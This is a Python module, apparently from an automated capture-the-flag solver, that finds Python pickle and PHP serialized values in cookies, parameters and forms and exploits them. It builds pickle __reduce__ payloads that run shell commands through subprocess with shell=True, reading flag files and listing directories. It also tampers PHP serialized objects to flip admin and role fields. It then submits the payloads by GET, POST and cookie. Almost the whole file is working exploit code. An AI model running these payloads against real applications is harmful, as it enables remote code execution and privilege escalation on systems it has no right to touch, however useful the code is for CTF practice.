"""Insecure deserialization probes: Python pickle and PHP objects.

* pickle blobs hide in cookies/params as base64 (leading bytes 0x80 0x0N)
  — when a value decodes to pickle, submit a __reduce__ payload running
  flag-hunting commands and watch for output/flags.
* PHP serialized values (O:4:"User":...) get their properties tampered
  into admin shapes; object-type confusion payloads cover the common
  'change one boolean to win' challenges.
"""
import base64
import pickle
import re
import urllib.parse

from core import httpx
from core.flag import extract_flags

PICKLE_CMDS = (
    "cat /flag* /flag/* /home/*/flag* 2>/dev/null",
    "cat flag* ../flag* 2>/dev/null",
    "ls -la / ; ls -la .",
)

PHP_TAMPER = [
    ('s:5:"admin";b:0', 's:5:"admin";b:1'),
    ('s:9:"isAdmin";b:0', 's:9:"isAdmin";b:1'),
    ('s:4:"role";s:5:"user"', 's:4:"role";s:5:"admin"'),
    ('s:7:"isUser";b:1', 's:7:"isUser";b:0'),
]


def _looks_pickle(raw):
    return len(raw) >= 2 and raw[0] == 0x80 and raw[1] in range(0, 6)


def _looks_php(value):
    v = value.strip()
    return bool(re.match(r'^(O|a|s):\d+:', v)) or v.startswith("Tzo")


def _decode_candidate(value):
    """Return (kind, decoded_bytes_or_str) for cookie/param strings."""
    value = urllib.parse.unquote(value.strip().strip('"'))
    if _looks_php(value):
        return "php", value
    try:
        padded = value + "=" * (-len(value) % 4)
        raw = base64.urlsafe_b64decode(padded) if "-_" in value else \
            base64.b64decode(padded, validate=True)
    except Exception:
        # raw hex?
        if re.fullmatch(r"(?:80\d{2})?[0-9a-fA-F]{40,}", value or ""):
            try:
                raw = bytes.fromhex(value)
            except ValueError:
                return None, None
        else:
            return None, None
    if isinstance(raw, bytes) and _looks_pickle(raw):
        return "pickle", raw
    return None, None


def build_pickle_payload(cmd):
    class Exploit:
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (cmd,), {"shell": True})

    return pickle.dumps(Exploit())


def _submit(base, name, value, endpoints):
    """Try the payload in the original param/cookie slot."""
    responses = []
    for ep in endpoints[:8]:
        sep = "&" if "?" in ep else "?"
        r = httpx.get(f"{ep}{sep}{name}={urllib.parse.quote(value)}",
                      timeout=8)
        if r is not None:
            responses.append(r)
        r = httpx.post(ep, data={name: value}, timeout=8)
        if r is not None:
            responses.append(r)
        r = httpx.get(ep, headers={"Cookie": f"{name}={value}"}, timeout=8)
        if r is not None:
            responses.append(r)
    return responses


def scan_deserialization(base, page_html, endpoints, sample_values=None):
    """Probe every cookie/param that smells like pickle or PHP serialize."""
    findings, flags = [], []
    candidates = []

    if sample_values:
        for name, value in sample_values.items():
            kind, decoded = _decode_candidate(str(value))
            if kind:
                candidates.append((name, str(value), kind))

    # also scan HTML for embedded serialized blobs (debug forms etc.)
    if page_html:
        for m in re.finditer(
                r'name=["\'](\w+)["\'][^>]*value=["\']([^"\']{20,400})["\']',
                page_html):
            kind, decoded = _decode_candidate(m.group(2))
            if kind:
                candidates.append((m.group(1), m.group(2), kind))

    seen = set()
    for name, original, kind in candidates[:6]:
        key = (name, kind)
        if key in seen:
            continue
        seen.add(key)

        if kind == "pickle":
            for cmd in PICKLE_CMDS:
                blob = build_pickle_payload(cmd)
                payload = base64.b64encode(blob).decode()
                responses = _submit(base, name, payload, endpoints)
                for r in responses:
                    known, cands = extract_flags(r.text)
                    if known or cands:
                        findings.append(
                            f"[!] pickle RCE via {name} "
                            f"(cmd={cmd!r}) → {known or cands}")
                        flags.extend(known or cands)
                        break
                    if "uid=" in r.text:  # id output leaked
                        findings.append(
                            f"[!] pickle RCE confirmed on {name}: "
                            f"{r.text[:120]}")
                        break
                if flags:
                    break
        elif kind == "php":
            tampered = original
            changed = False
            for old, new in PHP_TAMPER:
                if old in tampered:
                    tampered = tampered.replace(old, new)
                    changed = True
            if not changed:
                continue
            for enc in (tampered,
                        urllib.parse.quote(tampered),
                        base64.b64encode(tampered.encode()).decode()):
                responses = _submit(base, name, enc, endpoints)
                hit = False
                for r in responses:
                    known, cands = extract_flags(r.text)
                    if known or cands:
                        findings.append(
                            f"[!] PHP deserialization admin escalation via "
                            f"{name} → {known or cands}")
                        flags.extend(known or cands)
                        hit = True
                        break
                if hit or flags:
                    break
        if flags:
            break
    if not findings and candidates:
        findings.append(f"  [i] พบ serialized candidates: "
                        f"{[(n, k) for n, _, k in candidates]} — ลอง gadget chain เอง")
    return findings, list(dict.fromkeys(flags))
